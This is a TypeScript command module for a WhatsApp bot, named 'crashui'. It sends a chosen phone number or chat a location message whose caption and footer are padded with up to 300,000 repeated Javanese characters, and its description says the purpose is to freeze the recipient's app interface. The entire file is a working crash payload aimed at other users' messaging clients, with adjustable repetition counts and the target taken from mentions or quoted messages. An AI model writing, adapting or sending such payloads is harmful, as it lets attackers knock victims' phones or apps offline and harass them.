import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

const digits = (j: string) => String(j || "").split("@")[0].split(":")[0].replace(/\D/g, "");

export default {
  name: ["crashui", "crashuia14"],
  category: "group",
  description: "Congela la UI con ubicación + caption y footer gigantes. `.crashui [repeticiones]`.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const info: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
    const citado = info.participant ? digits(info.participant) : "";
    const mencion = info.mentionedJid?.[0] ? digits(info.mentionedJid[0]) : "";
    const escrito = (args[0] || "").replace(/\D/g, "");

    const num = escrito.length >= 8 ? escrito : mencion || citado;
    const target = num ? `${num}@s.whatsapp.net` : from;

    let repes = 120000;
    if (/^\d+$/.test(args[0] || "")) repes = Math.min(300000, Math.max(1000, Number(args[0])));

    const relleno = "ꦾ".repeat(repes);

    await react("🧨").catch(() => undefined);

    try {
      await sock.sendMessage(target, {
        location: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: "x",
          url: "x",
          address: "向导书呆子锁测试",
        },
        caption: "x" + relleno,
        footer: relleno,
        buttons: [
          {
            buttonId: "by x",
            buttonText: { displayText: "x" },
          },
        ],
      } as any);

      await react("☠️").catch(() => undefined);
      await reply(
        `🧨 ${fytBold("CrashUI enviado")} → ${num ? `+${num}` : "este chat"}\n` +
          `Repeticiones: ${repes.toLocaleString("es-MX")} (caption + footer)`,
      ).catch(() => undefined);
    } catch (e: any) {
      await react("❌").catch(() => undefined);
      await reply(`❌ ${e?.message || e}`).catch(() => undefined);
    }
  },
};
